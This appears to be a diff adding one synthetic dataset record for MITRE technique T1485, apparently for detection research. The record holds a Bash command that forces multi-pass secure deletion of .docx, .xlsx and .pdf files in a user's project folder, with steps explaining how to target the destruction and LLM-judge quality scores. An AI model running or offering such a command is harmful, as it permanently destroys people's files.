@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1485",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "find \"/Users/alice/Documents/Projects/Alpha\" -type f \\( -name \"*.docx\" -o -name \"*.xlsx\" -o -name \"*.pdf\" \\) -exec srm -fP {} +",
+  "explanation": "Selectively and permanently destroys key document formats within a single project directory.",
+  "rationale_steps": [
+    "Limit destruction to one project path and specific high-value extensions.",
+    "Use find to precisely target files and avoid directories.",
+    "Apply srm with -P for multi-pass overwrite and -f to force deletion."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-45236c1a-80ac6802",
+  "source_prompt_hash": "45236c1a",
+  "timestamp_utc": "2025-09-30T07:56:40.760169Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quotes and escaped parentheses with a correct find -exec ... {} + form and properly formatted flags.",
+        "semantic_score": 4,
+        "semantic_justification": "Selectively targets .docx/.xlsx/.pdf files and invokes srm with force/overwrite to securely delete them on macOS, though effectiveness and availability of srm on modern APFS/SSD systems may limit permanence.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T23:28:41.388658Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
